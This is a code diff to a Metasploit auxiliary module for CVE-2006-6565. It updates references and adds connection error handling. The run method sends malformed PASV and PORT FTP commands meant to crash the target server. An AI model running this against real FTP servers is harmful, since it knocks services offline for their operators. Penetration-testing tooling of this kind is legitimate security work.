@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -27,20 +23,29 @@ class Metasploit3 < Msf::Auxiliary
 			},
 			'Author' 		=> [ 'patrick' ],
 			'License'        	=> MSF_LICENSE,
-			'Version'        	=> '$Revision$',
 			'References'     =>
 				[
 					[ 'BID', '21542' ],
 					[ 'BID', '21549' ],
 					[ 'CVE', '2006-6565' ],
-					[ 'URL', 'http://www.milw0rm.com/exploits/2914' ],
-					[ 'OSVDB', '34435' ],
+					[ 'EDB', '2914' ],
+					[ 'OSVDB', '34435' ]
 				],
 			'DisclosureDate' => 'Dec 11 2006'))
 	end
 
 	def run
-		connect_login
+		begin
+			c = connect_login
+		rescue Rex::ConnectionRefused
+			print_error("Connection refused.")
+			return
+		rescue Rex::ConnectionTimeout
+			print_error("Connection timed out")
+			return
+		end
+
+		return if not c
 
 		send_cmd(['PASV', 'A*'], true) # Assigns PASV port
 		send_cmd(['PORT', 'A*'], true) # Rejected but seems to assign NULL to pointer
